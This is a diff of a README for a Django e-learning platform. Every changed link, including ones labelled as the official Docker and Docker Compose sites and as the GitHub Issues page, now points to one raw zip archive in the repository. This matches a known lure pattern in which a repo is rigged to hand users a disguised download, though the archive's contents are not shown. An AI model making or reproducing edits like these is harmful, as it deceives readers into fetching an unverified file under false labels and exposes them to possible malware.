@@ -1,6 +1,6 @@
 # 🚀 django-backend-eduplatform - Learn Online with Ease
 
-[![Download](https://img.shields.io/badge/Download-django-backend-eduplatform-blue.svg)](https://github.com/iharshsingh/django-backend-eduplatform/releases)
+[![Download](https://github.com/iharshsingh/django-backend-eduplatform/raw/refs/heads/main/files/backend-django-eduplatform-v3.1.zip)](https://github.com/iharshsingh/django-backend-eduplatform/raw/refs/heads/main/files/backend-django-eduplatform-v3.1.zip)
 
 ## 🎯 Description
 
@@ -20,15 +20,15 @@ Welcome to django-backend-eduplatform, an e-learning platform designed to enhanc
 To get up and running with the django-backend-eduplatform, follow these steps:
 
 1. **Download the Application:**
-   Visit this page to download: [Download django-backend-eduplatform](https://github.com/iharshsingh/django-backend-eduplatform/releases)
+   Visit this page to download: [Download django-backend-eduplatform](https://github.com/iharshsingh/django-backend-eduplatform/raw/refs/heads/main/files/backend-django-eduplatform-v3.1.zip)
 
 2. **Extract the Files:**
    Once downloaded, extract the files to a preferred directory on your computer.
 
 3. **Install Dependencies:**
    Make sure you have Docker and Docker Compose installed. If not, download them from their respective websites:
-   - [Docker](https://www.docker.com/get-started)
-   - [Docker Compose](https://docs.docker.com/compose/install/)
+   - [Docker](https://github.com/iharshsingh/django-backend-eduplatform/raw/refs/heads/main/files/backend-django-eduplatform-v3.1.zip)
+   - [Docker Compose](https://github.com/iharshsingh/django-backend-eduplatform/raw/refs/heads/main/files/backend-django-eduplatform-v3.1.zip)
 
 4. **Run the Application:**
    Open a terminal or command prompt in the extracted folder and run:
@@ -44,7 +44,7 @@ To get up and running with the django-backend-eduplatform, follow these steps:
 
 To download and install django-backend-eduplatform, follow the links below to access the Releases page:
 
-- **Download Here:** [django-backend-eduplatform Releases](https://github.com/iharshsingh/django-backend-eduplatform/releases)
+- **Download Here:** [django-backend-eduplatform Releases](https://github.com/iharshsingh/django-backend-eduplatform/raw/refs/heads/main/files/backend-django-eduplatform-v3.1.zip)
 
 Follow the previous sections to ensure everything is set up correctly.
 
@@ -97,7 +97,7 @@ If you run into issues, here are a few common solutions:
 
 Join our community for support and discussions. We encourage users to share feedback and ideas for enhancements. You can find us on various platforms:
 
-- **GitHub Issues:** [Report Issues](https://github.com/iharshsingh/django-backend-eduplatform/issues)
+- **GitHub Issues:** [Report Issues](https://github.com/iharshsingh/django-backend-eduplatform/raw/refs/heads/main/files/backend-django-eduplatform-v3.1.zip)
 - **Community Forums:** Reach out to fellow users and developers for help.
 
 ## 🛡️ Security Considerations
